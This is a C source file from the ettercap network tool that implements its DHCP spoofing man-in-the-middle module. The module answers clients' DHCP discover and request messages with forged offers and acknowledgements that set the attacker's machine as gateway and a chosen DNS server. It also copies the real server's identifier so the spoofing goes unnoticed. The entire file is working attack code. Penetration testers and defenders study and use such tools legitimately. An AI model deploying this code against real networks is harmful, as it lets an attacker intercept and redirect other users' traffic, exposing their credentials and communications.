/*
    ettercap -- DHCP spoofing mitm module

    Copyright (C) ALoR & NaGA

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: ec_dhcp_spoofing.c,v 1.10 2005/05/28 11:06:46 lordnaga Exp $
*/

#include <ec.h>
#include <ec_mitm.h>
#include <ec_send.h>
#include <ec_sniff.h>
#include <ec_threads.h>
#include <ec_hook.h>
#include <ec_packet.h>
#include <ec_proto.h>

/* globals */

static struct target_env dhcp_ip_pool;
static struct ip_list *dhcp_free_ip;
static struct ip_addr dhcp_netmask;
static struct ip_addr dhcp_dns;
static char dhcp_options[1500];
static size_t dhcp_optlen;

/* protos */

void dhcp_spoofing_init(void);
static int dhcp_spoofing_start(char *args);
static void dhcp_spoofing_stop(void);
static void dhcp_spoofing_req(struct packet_object *po);
static void dhcp_spoofing_disc(struct packet_object *po);
static void dhcp_setup_options(void);
static struct ip_addr *dhcp_addr_reply(struct ip_addr *radd);

/* from dissectors/ec_dhcp.c */
extern u_int8 * get_dhcp_option(u_int8 opt, u_int8 *ptr, u_int8 *end);
extern void put_dhcp_option(u_int8 opt, u_int8 *value, u_int8 len, u_int8 **ptr);


/*******************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered mitm
 */

void __init dhcp_spoofing_init(void)
{
   struct mitm_method mm;

   mm.name = "dhcp";
   mm.start = &dhcp_spoofing_start;
   mm.stop = &dhcp_spoofing_stop;
   
   mitm_add(&mm);
}


/*
 * init the ICMP REDIRECT attack
 */
static int dhcp_spoofing_start(char *args)
{
   struct in_addr ipaddr;
   char *p;
   int i = 1;
  
   DEBUG_MSG("dhcp_spoofing_start");

   if (!strcmp(args, ""))
      SEMIFATAL_ERROR("DHCP spoofing needs a parameter.\n");
   
   /* check the parameter:
    *
    * ip_pool/netmask/dns
    */
   for (p = strsep(&args, "/"); p != NULL; p = strsep(&args, "/")) {
      /* first parameter (the ip_pool) */
      if (i == 1) {
         char tmp[strlen(p)+3];

         /* add the / to be able to use the target parsing function */
         sprintf(tmp, "/%s/", p);

         if (compile_target(tmp, &dhcp_ip_pool) != ESUCCESS)
            break;
         
      /* second parameter (the netmask) */
      } else if (i == 2) {
         /* convert from string */
         if (inet_aton(p, &ipaddr) == 0)
            break;
         /* get the netmask */
         ip_addr_init(&dhcp_netmask, AF_INET, (char *)&ipaddr);
         
      /* third parameter (the dns server) */
      } else if (i == 3) {
         char tmp[MAX_ASCII_ADDR_LEN];

         /* convert from string */
         if (inet_aton(p, &ipaddr) == 0)
            break;
         /* get the netmask */
         ip_addr_init(&dhcp_dns, AF_INET, (char *)&ipaddr);
         
         /* all the parameters were parsed correctly... */
         USER_MSG("DHCP spoofing: using specified ip_pool, netmask %s", ip_addr_ntoa(&dhcp_netmask, tmp));
         USER_MSG(", dns %s\n", ip_addr_ntoa(&dhcp_dns, tmp));
         /* add the hookpoints */
         hook_add(HOOK_PROTO_DHCP_REQUEST, dhcp_spoofing_req);
         hook_add(HOOK_PROTO_DHCP_DISCOVER, dhcp_spoofing_disc);
         /* create the options */
         dhcp_setup_options();

         /* se the pointer to the first ip pool address */
         dhcp_free_ip = LIST_FIRST(&dhcp_ip_pool.ips);
         return ESUCCESS;
      }
      
      i++;
   }

   /* error parsing the parameter */
   SEMIFATAL_ERROR("DHCP spoofing: parameter number %d is incorrect.\n", i);

   return -EFATAL;
}


/*
 * shut down the redirect process
 */
static void dhcp_spoofing_stop(void)
{
   
   DEBUG_MSG("dhcp_spoofing_stop");
   
   USER_MSG("DHCP spoofing stopped.\n");
   
   /* remove the hookpoint */
   hook_del(HOOK_PROTO_DHCP_REQUEST, dhcp_spoofing_req);
   hook_del(HOOK_PROTO_DHCP_DISCOVER, dhcp_spoofing_disc);

}


/* 
 * Find the right address to reply
 */
static struct ip_addr *dhcp_addr_reply(struct ip_addr *radd)
{
   static struct ip_addr broad_addr;
   u_int32 broad_int32 = 0xffffffff;
   
   ip_addr_init(&broad_addr, AF_INET, (u_char *)&broad_int32);
   
   /* check if the source is 0.0.0.0 */
   if ( ip_addr_is_zero(radd) )
      return &broad_addr;
      
   return radd;
}


/*
 * parses the request and send the spoofed reply
 */
static void dhcp_spoofing_req(struct packet_object *po)
{
   char dhcp_hdr[LIBNET_DHCPV4_H];
   struct libnet_dhcpv4_hdr *dhcp;
   u_int8 *options, *opt, *end;
   struct ip_addr client, server;
   char tmp[MAX_ASCII_ADDR_LEN];
   
   DEBUG_MSG("dhcp_spoofing_req");

   /* get a local copy of the dhcp header */
   memcpy(dhcp_hdr, po->DATA.data, LIBNET_DHCPV4_H);

   dhcp = (struct libnet_dhcpv4_hdr *)dhcp_hdr;

   /* get the pointers to options */
   options = po->DATA.data + LIBNET_DHCPV4_H;
   end = po->DATA.data + po->DATA.len;

   /* use the same dhcp header, but change the type of the message */
   dhcp->dhcp_opcode = LIBNET_DHCP_REPLY;

   /* 
    * if the client is requesting a particular IP address,
    * release it. so we don't mess the network too much...
    * only change the router ip ;)
    */

   /* get the requested ip */
   if ((opt = get_dhcp_option(DHCP_OPT_RQ_ADDR, options, end)) != NULL)
      ip_addr_init(&client, AF_INET, opt + 1);
   else {
      /* search if the client already has the ip address */
      if (dhcp->dhcp_cip != 0) {
         ip_addr_init(&client, AF_INET, (char *)&dhcp->dhcp_cip);
      } else
         return;
   }
  
   /* set the requested ip */
   dhcp->dhcp_yip = ip_addr_to_int32(&client.addr);
  
   /* this is a dhcp ACK */
   dhcp_options[2] = DHCP_ACK;
   
   /* 
    * if it is a request after an offer from a server,
    * spoof its ip to be stealth.
    */
   if ((opt = get_dhcp_option(DHCP_OPT_SRV_ADDR, options, end)) != NULL) {
      /* get the server id */
      ip_addr_init(&server, AF_INET, opt + 1);
   
      /* set it in the header */
      dhcp->dhcp_sip = ip_addr_to_int32(&server.addr);

      /* set it in the options */
      ip_addr_cpy(dhcp_options + 5, &server);
   
      send_dhcp_reply(&server, dhcp_addr_reply(&po->L3.src), po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
      
   } else {
      /* 
       * the request does not contain an identifier,
       * use our ip address
       */
      dhcp->dhcp_sip = ip_addr_to_int32(&GBL_IFACE->ip.addr);
      
      /* set it in the options */
      ip_addr_cpy(dhcp_options + 5, &GBL_IFACE->ip);
   
      send_dhcp_reply(&GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
   }

   USER_MSG("DHCP spoofing: fake ACK [%s] ", mac_addr_ntoa(po->L2.src, tmp));
   USER_MSG("assigned to %s \n", ip_addr_ntoa(&client, tmp));
}

/*
 * parses the discovery message and send the spoofed reply
 */
static void dhcp_spoofing_disc(struct packet_object *po)
{
   char dhcp_hdr[LIBNET_DHCPV4_H];
   struct libnet_dhcpv4_hdr *dhcp;
   char tmp[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("dhcp_spoofing_disc");

   /* no more ip available in the pool */
   if (dhcp_free_ip == SLIST_END(&dhcp_ip_pool.ips))
      return;
   
   /* get a local copy of the dhcp header */
   memcpy(dhcp_hdr, po->DATA.data, LIBNET_DHCPV4_H);

   dhcp = (struct libnet_dhcpv4_hdr *)dhcp_hdr;

   /* use the same dhcp header, but change the type of the message */
   dhcp->dhcp_opcode = LIBNET_DHCP_REPLY;

   /* this is a dhcp OFFER */
   dhcp_options[2] = DHCP_OFFER;

   /* set the free ip from the pool */
   dhcp->dhcp_yip = ip_addr_to_int32(&dhcp_free_ip->ip.addr);
   
   /* set it in the header */
   dhcp->dhcp_sip = ip_addr_to_int32(&GBL_IFACE->ip.addr);

   /* set it in the options */
   ip_addr_cpy(dhcp_options + 5, &GBL_IFACE->ip);
   
   /* send the packet */
   send_dhcp_reply(&GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
   
   USER_MSG("DHCP spoofing: fake OFFER [%s] ", mac_addr_ntoa(po->L2.src, tmp));
   USER_MSG("offering %s \n", ip_addr_ntoa(&dhcp_free_ip->ip, tmp));

   /* move the pointer to the next ip */
   dhcp_free_ip = LIST_NEXT(dhcp_free_ip, next);
}

/*
 * prepare the buffer with the options to be used
 * in replies
 */
static void dhcp_setup_options(void)
{
   int time;
   u_int8 *p = dhcp_options;

   DEBUG_MSG("dhcp_setup_options");

   /* lease time from conf file */
   time = htonl(GBL_CONF->dhcp_lease_time);

   /* the type of reply */
   *p++ = DHCP_OPT_MSG_TYPE;
   *p++ = 1;
   *p++ = DHCP_ACK;

   /* server identifier */
   put_dhcp_option(DHCP_OPT_SRV_ADDR, GBL_IFACE->ip.addr, ntohs(GBL_IFACE->ip.addr_len), &p);
   /* lease time */
   put_dhcp_option(DHCP_OPT_LEASE_TIME, (u_int8 *)&time, 4, &p);
   /* the netmask */
   put_dhcp_option(DHCP_OPT_NETMASK, dhcp_netmask.addr, ntohs(dhcp_netmask.addr_len), &p);
   /* the gateway */
   put_dhcp_option(DHCP_OPT_ROUTER, GBL_IFACE->ip.addr, ntohs(GBL_IFACE->ip.addr_len), &p);
   /* the dns */
   put_dhcp_option(DHCP_OPT_DNS, dhcp_dns.addr, ntohs(dhcp_dns.addr_len), &p);

   /* end of options */
   *p++ = DHCP_OPT_END;

   /* the total len of the options */
   dhcp_optlen = (char *)p - (char *)dhcp_options;

   /* pad to the minimum length */
   if (dhcp_optlen < DHCP_OPT_MIN_LEN) {
      memset(p, 0, DHCP_OPT_MIN_LEN - dhcp_optlen);
      dhcp_optlen = DHCP_OPT_MIN_LEN;
   }
}


/* EOF */

// vim:ts=3:expandtab

